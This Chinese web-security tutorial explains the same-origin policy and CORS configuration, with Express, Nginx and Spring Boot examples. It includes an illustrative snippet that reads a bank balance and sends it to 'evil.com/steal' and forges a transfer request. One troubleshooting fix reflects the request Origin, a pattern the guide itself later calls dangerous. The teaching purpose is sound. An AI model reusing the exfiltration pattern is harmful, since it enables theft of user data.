---
title: CORS 跨域资源共享
description: 深入理解CORS机制和配置
track: security
section: web-security
difficulty: intermediate
tags:
  - CORS
  - 跨域
  - 同源策略
  - Web安全
status: imported
origin: old/src/content/docs/security/cors.zh.md
divergence: 0.287
issues: []
legacy:
  category: Security
  subcategory: Web Security
  order: 22
  lastUpdated: 2026-01-07
---

CORS（Cross-Origin Resource Sharing，跨域资源共享）是现代 Web 开发中不可或缺的安全机制。它允许服务器声明哪些来源可以访问其资源，从而在保证安全性的同时实现跨域数据交互。本文将深入探讨 CORS 的工作原理、配置方法以及常见问题的解决方案。

## 同源策略（Same-Origin Policy）

### 什么是同源策略

同源策略是浏览器最核心的安全机制之一，它限制了来自不同源的文档或脚本如何与当前文档的资源进行交互。这一策略的目的是防止恶意网站读取其他网站的敏感数据。

两个 URL 被认为是"同源"的，当且仅当它们的以下三个部分完全相同：

- **协议（Protocol）**：如 `http` 或 `https`
- **主机（Host）**：如 `example.com`
- **端口（Port）**：如 `80` 或 `443`

```
┌─────────────────────────────────────────────────────────────────┐
│                        同源判断示例                               │
├─────────────────────────────────────────────────────────────────┤
│  基准 URL: https://www.example.com:443/page                      │
├─────────────────────────────────────────────────────────────────┤
│  https://www.example.com/api     │  同源    │ 端口默认443         │
│  https://www.example.com:443/app │  同源    │ 完全匹配            │
│  http://www.example.com/api      │  跨域    │ 协议不同            │
│  https://api.example.com/data    │  跨域    │ 主机不同            │
│  https://www.example.com:8080    │  跨域    │ 端口不同            │
└─────────────────────────────────────────────────────────────────┘
```

### 同源策略限制的内容

同源策略主要限制以下三类跨域行为：

1. **Cookie、LocalStorage 和 IndexedDB 的读取**
2. **DOM 的获取和操作**
3. **AJAX 请求的发送**

```javascript
// 跨域请求示例 - 会被同源策略阻止
fetch('https://api.other-domain.com/data')
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => {
    // 如果没有正确的 CORS 配置，将会抛出错误
    console.error('跨域请求被阻止:', error);
  });
```

### 为什么需要同源策略

同源策略防止了多种安全威胁：

```javascript
// 如果没有同源策略，恶意网站可以：

// 1. 窃取其他网站的敏感数据
fetch('https://bank.com/api/account-balance')
  .then(res => res.json())
  .then(data => {
    // 将用户银行余额发送给攻击者
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });

// 2. 冒充用户执行操作
fetch('https://bank.com/api/transfer', {
  method: 'POST',
  body: JSON.stringify({
    to: 'attacker-account',
    amount: 10000
  }),
  credentials: 'include' // 携带用户的认证信息
});
```

## CORS 机制详解

### CORS 的工作原理

CORS 通过一组 HTTP 响应头来告诉浏览器，哪些跨域请求是被允许的。当浏览器检测到跨域请求时，会根据请求的类型决定是直接发送还是先发送预检请求。

```
┌─────────────────────────────────────────────────────────────────┐
│                      CORS 请求流程                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│   浏览器                           服务器                         │
│     │                               │                            │
│     │  ──── 1. 发送请求 ────────>   │                            │
│     │       Origin: https://a.com   │                            │
│     │                               │                            │
│     │  <─── 2. 返回响应 ────────    │                            │
│     │       Access-Control-Allow-   │                            │
│     │       Origin: https://a.com   │                            │
│     │                               │                            │
│     │  3. 检查 CORS 头              │                            │
│     │     - 如果匹配：允许访问响应    │                            │
│     │     - 如果不匹配：阻止访问      │                            │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 简单请求（Simple Request）

满足以下所有条件的请求被视为"简单请求"，可以直接发送：

- 请求方法是 `GET`、`HEAD` 或 `POST`
- 请求头仅包含以下字段：
  - `Accept`
  - `Accept-Language`
  - `Content-Language`
  - `Content-Type`（仅限 `text/plain`、`multipart/form-data`、`application/x-www-form-urlencoded`）
- 没有为请求中的任何 `XMLHttpRequestUpload` 对象注册事件监听器
- 请求中没有使用 `ReadableStream` 对象

```javascript
// 简单请求示例
fetch('https://api.example.com/data', {
  method: 'GET',
  headers: {
    'Accept': 'application/json'
  }
});

// 这也是简单请求
fetch('https://api.example.com/submit', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'name=value&other=data'
});
```

### 预检请求（Preflight Request）

不满足简单请求条件的跨域请求，浏览器会先发送一个 `OPTIONS` 请求进行"预检"，以确认服务器是否允许该跨域请求。

```
┌─────────────────────────────────────────────────────────────────┐
│                     预检请求流程                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│   浏览器                            服务器                        │
│     │                                │                           │
│     │  ─── OPTIONS 预检请求 ──────>  │                           │
│     │      Origin: https://a.com     │                           │
│     │      Access-Control-Request-   │                           │
│     │        Method: PUT             │                           │
│     │      Access-Control-Request-   │                           │
│     │        Headers: Content-Type   │                           │
│     │                                │                           │
│     │  <── 预检响应 ────────────────  │                           │
│     │      Access-Control-Allow-     │                           │
│     │        Origin: https://a.com   │                           │
│     │      Access-Control-Allow-     │                           │
│     │        Methods: PUT, POST      │                           │
│     │      Access-Control-Allow-     │                           │
│     │        Headers: Content-Type   │                           │
│     │      Access-Control-Max-Age:   │                           │
│     │        86400                   │                           │
│     │                                │                           │
│     │  ─── 实际请求 PUT ──────────>  │                           │
│     │                                │                           │
│     │  <── 实际响应 ────────────────  │                           │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

```javascript
// 会触发预检请求的示例
fetch('https://api.example.com/data', {
  method: 'PUT',  // 非简单方法
  headers: {
    'Content-Type': 'application/json',  // 非简单 Content-Type
    'X-Custom-Header': 'value'           // 自定义请求头
  },
  body: JSON.stringify({ key: 'value' })
});
```

## CORS 响应头详解

### Access-Control-Allow-Origin

指定允许访问资源的来源。

```http
# 允许特定来源
Access-Control-Allow-Origin: https://example.com

# 允许所有来源（不推荐用于敏感数据）
Access-Control-Allow-Origin: *
```

```javascript
// Node.js Express 示例
app.use((req, res, next) => {
  const allowedOrigins = [
    'https://app.example.com',
    'https://admin.example.com'
  ];

  const origin = req.headers.origin;

  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }

  next();
});
```

### Access-Control-Allow-Methods

指定允许的 HTTP 方法。

```http
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
```

### Access-Control-Allow-Headers

指定允许的请求头。

```http
Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With
```

### Access-Control-Expose-Headers

指定哪些响应头可以被浏览器访问。默认情况下，浏览器只能访问以下响应头：

- `Cache-Control`
- `Content-Language`
- `Content-Type`
- `Expires`
- `Last-Modified`
- `Pragma`

```http
# 允许前端访问自定义响应头
Access-Control-Expose-Headers: X-Total-Count, X-Page-Size
```

```javascript
// 前端代码可以访问暴露的头
fetch('https://api.example.com/users')
  .then(response => {
    // 如果服务器暴露了这些头，就可以读取
    const totalCount = response.headers.get('X-Total-Count');
    const pageSize = response.headers.get('X-Page-Size');
    console.log(`共 ${totalCount} 条，每页 ${pageSize} 条`);
    return response.json();
  });
```

### Access-Control-Max-Age

指定预检请求的结果可以被缓存多长时间（秒）。

```http
# 缓存预检结果 24 小时
Access-Control-Max-Age: 86400
```

### Access-Control-Allow-Credentials

指定是否允许发送 Cookie 和 HTTP 认证信息。

```http
Access-Control-Allow-Credentials: true
```

## 携带凭证的请求（Credentials）

### 什么是凭证

凭证包括 Cookie、HTTP 认证信息和 TLS 客户端证书。默认情况下，跨域请求不会发送凭证。

### 发送凭证请求

```javascript
// 使用 fetch API
fetch('https://api.example.com/user/profile', {
  method: 'GET',
  credentials: 'include'  // 携带凭证
});

// 使用 XMLHttpRequest
const xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.example.com/user/profile');
xhr.withCredentials = true;  // 携带凭证
xhr.send();

// 使用 axios
axios.get('https://api.example.com/user/profile', {
  withCredentials: true
});
```

### 服务器端配置

当请求携带凭证时，服务器必须满足以下条件：

1. `Access-Control-Allow-Credentials` 必须为 `true`
2. `Access-Control-Allow-Origin` **不能**为 `*`，必须指定具体的来源

```javascript
// Express 中间件示例
app.use((req, res, next) => {
  const origin = req.headers.origin;
  const allowedOrigins = ['https://app.example.com'];

  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }

  next();
});
```

```
┌─────────────────────────────────────────────────────────────────┐
│                   凭证请求的 CORS 要求                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  客户端：                                                         │
│  ├── credentials: 'include' (fetch)                              │
│  └── withCredentials: true (XMLHttpRequest)                      │
│                                                                  │
│  服务器响应：                                                      │
│  ├── Access-Control-Allow-Origin: https://specific-origin.com   │
│  │   (必须是具体来源，不能是 *)                                     │
│  └── Access-Control-Allow-Credentials: true                      │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

## 常见问题与解决方案

### 问题 1：预检请求失败

**症状**：
```
Access to fetch at 'https://api.example.com/data' from origin
'https://app.example.com' has been blocked by CORS policy:
Response to preflight request doesn't pass access control check
```

**原因**：服务器没有正确处理 OPTIONS 请求。

**解决方案**：

```javascript
// Express 解决方案
app.options('*', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Max-Age', '86400');
  res.status(204).end();
});
```

### 问题 2：凭证请求被阻止

**症状**：
```
Access to fetch at 'https://api.example.com/user' from origin
'https://app.example.com' has been blocked by CORS policy:
The value of the 'Access-Control-Allow-Origin' header in the response
must not be the wildcard '*' when the request's credentials mode is 'include'.
```

**原因**：使用了 `credentials: 'include'`，但服务器返回了 `Access-Control-Allow-Origin: *`。

**解决方案**：

```javascript
// 服务器需要返回具体的来源
app.use((req, res, next) => {
  const origin = req.headers.origin;

  // 验证来源是否在白名单中
  if (isAllowedOrigin(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }

  next();
});
```

### 问题 3：自定义请求头被阻止

**症状**：
```
Request header field X-Custom-Header is not allowed by
Access-Control-Allow-Headers in preflight response.
```

**原因**：服务器没有在 `Access-Control-Allow-Headers` 中包含该自定义头。

**解决方案**：

```javascript
// 添加需要的自定义头
res.setHeader(
  'Access-Control-Allow-Headers',
  'Content-Type, Authorization, X-Custom-Header, X-Requested-With'
);
```

### 问题 4：无法读取响应头

**症状**：前端代码无法读取某些响应头。

```javascript
fetch('https://api.example.com/data')
  .then(response => {
    // 返回 null
    console.log(response.headers.get('X-Total-Count'));
  });
```

**原因**：服务器没有暴露该响应头。

**解决方案**：

```javascript
// 服务器端暴露响应头
res.setHeader('Access-Control-Expose-Headers', 'X-Total-Count');
res.setHeader('X-Total-Count', '100');
```

### 问题 5：开发环境跨域

**症状**：开发时前端项目（如 localhost:3000）无法访问后端 API（如 localhost:8080）。

**解决方案**：

```javascript
// 方案 1：使用开发代理（推荐）
// vite.config.js
export default {
  server: {
    proxy: {
      '/api': {
        target: 'http://localhost:8080',
        changeOrigin: true
      }
    }
  }
};

// 方案 2：后端添加开发环境 CORS 支持
if (process.env.NODE_ENV === 'development') {
  app.use(cors({
    origin: 'http://localhost:3000',
    credentials: true
  }));
}
```

## 安全配置最佳实践

### 不要使用通配符 `*`

在生产环境中，避免使用 `Access-Control-Allow-Origin: *`，尤其是涉及敏感数据的 API。

```javascript
// 不推荐
res.setHeader('Access-Control-Allow-Origin', '*');

// 推荐：使用白名单
const whitelist = [
  'https://app.example.com',
  'https://admin.example.com'
];

const origin = req.headers.origin;
if (whitelist.includes(origin)) {
  res.setHeader('Access-Control-Allow-Origin', origin);
}
```

### 验证 Origin 头

不要直接反射 Origin 头的值，而是验证它是否在允许列表中。

```javascript
// 危险：直接反射 Origin
res.setHeader('Access-Control-Allow-Origin', req.headers.origin);

// 安全：验证后再设置
function isValidOrigin(origin) {
  const allowedOrigins = [
    'https://app.example.com',
    'https://admin.example.com'
  ];

  // 使用严格匹配，避免子域名绕过
  return allowedOrigins.includes(origin);
}

if (isValidOrigin(req.headers.origin)) {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
}
```

### 限制允许的方法和头

只允许实际需要的 HTTP 方法和请求头。

```javascript
// 不推荐：允许所有方法
res.setHeader('Access-Control-Allow-Methods', '*');

// 推荐：只允许需要的方法
res.setHeader('Access-Control-Allow-Methods', 'GET, POST');

// 不推荐：允许所有头
res.setHeader('Access-Control-Allow-Headers', '*');

// 推荐：只允许需要的头
res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
```

### 谨慎使用 Credentials

只有在确实需要时才启用凭证支持。

```javascript
// 只在需要认证的路由启用凭证
app.use('/api/protected/*', (req, res, next) => {
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});

// 公开 API 不需要凭证支持
app.use('/api/public/*', (req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  next();
});
```

### 设置合理的缓存时间

预检请求缓存时间不宜过长，以便及时响应策略变更。

```javascript
// 推荐：设置为 1-24 小时
res.setHeader('Access-Control-Max-Age', '3600');  // 1 小时

// 不推荐：过长的缓存时间
res.setHeader('Access-Control-Max-Age', '31536000');  // 1 年
```

## 完整的 CORS 配置示例

### Express 配置

```javascript
const express = require('express');
const app = express();

// CORS 配置
const corsOptions = {
  allowedOrigins: [
    'https://app.example.com',
    'https://admin.example.com'
  ],
  allowedMethods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
  exposedHeaders: ['X-Total-Count', 'X-Page-Size'],
  credentials: true,
  maxAge: 3600
};

// CORS 中间件
function corsMiddleware(req, res, next) {
  const origin = req.headers.origin;

  // 检查来源是否在白名单中
  if (corsOptions.allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', String(corsOptions.credentials));
  }

  // 处理预检请求
  if (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Allow-Methods', corsOptions.allowedMethods.join(', '));
    res.setHeader('Access-Control-Allow-Headers', corsOptions.allowedHeaders.join(', '));
    res.setHeader('Access-Control-Max-Age', String(corsOptions.maxAge));
    return res.status(204).end();
  }

  // 设置暴露的响应头
  res.setHeader('Access-Control-Expose-Headers', corsOptions.exposedHeaders.join(', '));

  next();
}

app.use(corsMiddleware);

// 路由
app.get('/api/data', (req, res) => {
  res.json({ message: 'Hello, CORS!' });
});

app.listen(3000);
```

### 使用 cors 包

```javascript
const express = require('express');
const cors = require('cors');
const app = express();

// 基本配置
app.use(cors({
  origin: ['https://app.example.com', 'https://admin.example.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  exposedHeaders: ['X-Total-Count'],
  credentials: true,
  maxAge: 3600
}));

// 或者使用动态验证
app.use(cors({
  origin: function (origin, callback) {
    const allowedOrigins = ['https://app.example.com'];

    // 允许没有 origin 的请求（如移动应用或服务器请求）
    if (!origin) return callback(null, true);

    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
```

### Nginx 配置

```nginx
server {
    listen 80;
    server_name api.example.com;

    location / {
        # 设置允许的来源
        set $cors_origin "";
        if ($http_origin ~* "^https://(app|admin)\.example\.com$") {
            set $cors_origin $http_origin;
        }

        # CORS 响应头
        add_header 'Access-Control-Allow-Origin' $cors_origin always;
        add_header 'Access-Control-Allow-Credentials' 'true' always;
        add_header 'Access-Control-Expose-Headers' 'X-Total-Count' always;

        # 处理预检请求
        if ($request_method = 'OPTIONS') {
            add_header 'Access-Control-Allow-Origin' $cors_origin always;
            add_header 'Access-Control-Allow-Methods' 'GET, POST, PUT, DELETE, OPTIONS' always;
            add_header 'Access-Control-Allow-Headers' 'Content-Type, Authorization' always;
            add_header 'Access-Control-Allow-Credentials' 'true' always;
            add_header 'Access-Control-Max-Age' 3600 always;
            add_header 'Content-Type' 'text/plain; charset=utf-8';
            add_header 'Content-Length' 0;
            return 204;
        }

        proxy_pass http://backend;
    }
}
```

### Spring Boot 配置

```java
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.cors.CorsConfiguration;
import org.springframework.web.cors.UrlBasedCorsConfigurationSource;
import org.springframework.web.filter.CorsFilter;

@Configuration
public class CorsConfig {

    @Bean
    public CorsFilter corsFilter() {
        CorsConfiguration config = new CorsConfiguration();

        // 允许的来源
        config.addAllowedOrigin("https://app.example.com");
        config.addAllowedOrigin("https://admin.example.com");

        // 允许的方法
        config.addAllowedMethod("GET");
        config.addAllowedMethod("POST");
        config.addAllowedMethod("PUT");
        config.addAllowedMethod("DELETE");

        // 允许的请求头
        config.addAllowedHeader("Content-Type");
        config.addAllowedHeader("Authorization");

        // 暴露的响应头
        config.addExposedHeader("X-Total-Count");

        // 允许凭证
        config.setAllowCredentials(true);

        // 预检请求缓存时间
        config.setMaxAge(3600L);

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/**", config);

        return new CorsFilter(source);
    }
}
```

## CORS 与其他技术的关系

### CORS 与 JSONP

JSONP 是 CORS 出现之前的跨域解决方案，通过动态创建 `<script>` 标签来绑过同源策略。

```javascript
// JSONP 示例（已过时）
function jsonpCallback(data) {
  console.log(data);
}

const script = document.createElement('script');
script.src = 'https://api.example.com/data?callback=jsonpCallback';
document.body.appendChild(script);
```

| 特性 | CORS | JSONP |
|------|------|-------|
| HTTP 方法 | 支持所有方法 | 仅支持 GET |
| 错误处理 | 完善 | 困难 |
| 安全性 | 高 | 低（存在 XSS 风险） |
| 浏览器支持 | IE10+ | 所有浏览器 |
| 推荐程度 | 推荐 | 不推荐 |

### CORS 与 CSP

内容安全策略（CSP）和 CORS 是两个不同但互补的安全机制：

- **CORS**：控制其他来源对本站资源的访问
- **CSP**：控制本站页面可以加载哪些来源的资源

```http
# CSP 示例
Content-Security-Policy: default-src 'self';
  script-src 'self' https://cdn.example.com;
  connect-src 'self' https://api.example.com;
```

### CORS 与 WebSocket

WebSocket 连接不受同源策略的限制，但服务器仍然可以通过检查 `Origin` 头来限制连接。

```javascript
// 服务器端 WebSocket Origin 验证
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', (ws, req) => {
  const origin = req.headers.origin;
  const allowedOrigins = ['https://app.example.com'];

  if (!allowedOrigins.includes(origin)) {
    ws.close(1008, 'Origin not allowed');
    return;
  }

  // 处理连接...
});
```

## 调试 CORS 问题

### 浏览器开发者工具

1. 打开 Network 面板
2. 查看失败的请求
3. 检查请求头中的 `Origin`
4. 检查响应头中的 `Access-Control-*` 头

### 常用调试命令

```bash
# 使用 curl 模拟跨域请求
curl -v -X OPTIONS \
  -H "Origin: https://app.example.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type" \
  https://api.example.com/data

# 检查响应头
curl -I -X OPTIONS \
  -H "Origin: https://app.example.com" \
  https://api.example.com/data
```

### 调试清单

```
┌─────────────────────────────────────────────────────────────────┐
│                     CORS 调试清单                                │
├─────────────────────────────────────────────────────────────────┤
│  [ ] 服务器是否返回了 Access-Control-Allow-Origin 头？           │
│  [ ] Allow-Origin 的值是否与请求的 Origin 匹配？                  │
│  [ ] 如果是预检请求，服务器是否正确处理了 OPTIONS？               │
│  [ ] 请求的方法是否在 Access-Control-Allow-Methods 中？          │
│  [ ] 请求的头是否在 Access-Control-Allow-Headers 中？            │
│  [ ] 如果携带凭证，Allow-Origin 是否为具体值（非 *）？            │
│  [ ] 如果携带凭证，是否设置了 Allow-Credentials: true？          │
│  [ ] 需要读取的响应头是否在 Expose-Headers 中？                  │
└─────────────────────────────────────────────────────────────────┘
```

## 总结

CORS 是现代 Web 开发中处理跨域请求的标准机制。正确理解和配置 CORS 对于构建安全的 Web 应用至关重要。

### 核心要点

1. **同源策略**是浏览器的基础安全机制，CORS 是在此基础上实现安全跨域访问的方案
2. **简单请求**直接发送，**复杂请求**需要先发送预检请求
3. 携带凭证的请求需要特殊配置，`Access-Control-Allow-Origin` 不能为 `*`
4. 安全配置应使用白名单验证来源，避免过度开放权限
5. 开发环境推荐使用代理解决跨域问题

### 安全建议

- 始终使用来源白名单，不要使用 `*`
- 只允许必要的 HTTP 方法和请求头
- 谨慎启用凭证支持
- 定期审查 CORS 配置
- 结合其他安全机制（如 CSP、CSRF 防护）一起使用

通过本文的学习，你应该能够理解 CORS 的工作原理，正确配置 CORS 策略，以及诊断和解决常见的跨域问题。在实际开发中，请始终牢记安全第一的原则，合理配置 CORS 以保护你的应用和用户数据。
